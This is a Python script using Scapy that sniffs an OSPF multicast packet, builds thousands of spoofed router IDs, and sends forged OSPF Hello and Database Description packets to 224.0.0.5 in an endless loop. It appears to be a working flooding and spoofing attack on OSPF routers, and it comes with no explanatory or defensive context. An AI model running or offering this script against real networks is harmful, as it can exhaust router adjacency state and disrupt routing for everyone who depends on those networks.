#!/usr/bin/env python

from scapy.all import *

load_contrib('ospf')


p = sniff(filter="ip dst 224.0.0.5",count=1)[0]

# ---------------------------------
spoof_list = []

for x in range(255):
   for y in range(50):

      ip = '2.2.' + str(x) +'.' + str(y);
      spoof_list.append(ip)

# ------------------------

ospf_hdr=OSPF_Hdr(area='0.0.0.10',src=spoof_list)
ospf_hello=OSPF_Hello(mask='255.255.255.252',options='E+L',router='10.0.0.2')
ospf_lls=OSPF_LLS_Hdr(llstlv=LLS_Extended_Options(type=1, len=4, options='\x00\x00\x00\x01'))

ospf= ospf_hdr / ospf_hello / ospf_lls

spoofed_hello_packet = Ether() / IP(dst='224.0.0.5', ttl=1) / ospf

# ----------------------

ospf_dbd=OSPF_DBDesc()
ospf= ospf_hdr / ospf_dbd / ospf_lls
spoofed_dbd_packet = Ether() / IP(dst='224.0.0.5', ttl=1) / ospf

# -----------------------

while(1):
  sendp(spoofed_hello_packet)
  sendp(spoofed_dbd_packet)
































